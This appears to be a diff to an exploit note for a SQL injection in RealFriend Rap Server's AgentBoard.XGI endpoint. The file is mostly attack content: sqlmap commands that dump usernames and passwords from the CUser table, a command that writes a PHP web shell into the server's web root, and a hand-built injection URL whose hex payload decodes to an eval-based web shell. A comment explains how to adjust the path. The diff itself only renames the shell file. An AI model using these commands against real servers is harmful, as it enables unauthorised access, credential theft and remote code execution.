@@ -12,7 +12,7 @@ exp:
 sqlmap -u 'http://url/AgentBoard.XGI?user='||'1' -D CASSystemDS -T CUser -C name,pwd --dump
 sqlmap -u "" --file-write "/root/shell/shell-php/biaozun.php" --file-dest "C:\RealFriend\Rap Server\WebRoot\3.php"
 #或者手动
-http://172.16.1.200:8081/AgentBoard.XGI?user=%27%7C%7C%271%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27C%3A%2FRealFriend%2FRap%20Server%2FWebRoot%2F7.php%27%20LINES%20TERMINATED%20BY%200x3c3f70687020406576616c28245f504f53545b22636d64225d293f3e--%20-&cmd=UserLogin
+http://172.16.1.200:8081/AgentBoard.XGI?user=%27%7C%7C%271%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27C%3A%2FRealFriend%2FRap%20Server%2FWebRoot%2F3.php%27%20LINES%20TERMINATED%20BY%200x3c3f70687020406576616c28245f504f53545b22636d64225d293f3e--%20-&cmd=UserLogin
 #需要修改绝对路径,内容是16进制,<?php @eval($_POST["cmd"])?>
 ```
 
